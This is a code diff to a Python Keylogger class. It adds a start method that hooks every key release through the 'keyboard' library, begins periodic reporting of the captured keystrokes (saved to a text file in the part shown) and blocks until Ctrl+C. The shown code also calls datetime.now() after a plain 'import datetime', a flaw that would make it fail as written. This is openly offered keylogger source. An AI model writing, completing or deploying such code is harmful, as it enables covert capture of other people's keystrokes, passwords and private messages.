@@ -1,5 +1,6 @@
 import datetime
 from threading import Timer
+import keyboard
 
 class Keylogger:
     def __init__(self, interval=60, reportMethod="file"):
@@ -59,6 +60,17 @@ class Keylogger:
         with open(f"{self.filename}.txt", "w") as f:
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
+
+    def start(self):
+        self.startDatetime = datetime.now()
+        # Start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # Start reporting the keylogs
+        self.report()
+        # Make a simple message
+        print(f"{datetime.now()} - Started keylogger")
+        # Block the current thread, wait until CTRL+C is pressed
+        keyboard.wait()
 
     def updateFilename(self):
         """
